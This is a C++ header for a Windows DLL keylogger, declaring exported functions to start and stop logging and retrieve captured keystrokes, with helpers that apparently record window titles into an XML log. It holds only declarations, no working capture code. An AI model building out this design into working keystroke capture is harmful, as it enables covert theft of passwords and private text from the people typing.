//KLogger.h
#include "stdafx.h"
#include <windows.h>
#include <fstream>
#include <process.h>
#include <time.h>
#include <sys/types.h>
#include <sys/timeb.h>
#include <string>

using namespace std;

#define DllExport   __declspec( dllexport ) 

//Global Variable
HANDLE hThread;
char logfile[MAX_PATH];
static std::string xmlBuffer="";
string reg_ex="></Entry>";
static int firstCall;                  //to check the add title is for first call
static int iTimeStamp;                  //to increment the timestamp after getdata
HANDLE hthread;
static bool KLogStarted = false;
static bool isLogging = false;

bool FileExists(const char *filename);
int KeyLogger(char key);
void addTITLE(char *title);
void KeyCheck(void *k);
DllExport void StartLogging();
DllExport void StopLogging();
DllExport char* GetAllKeystrokes();
DllExport char* GetKeystrokes(int in_min);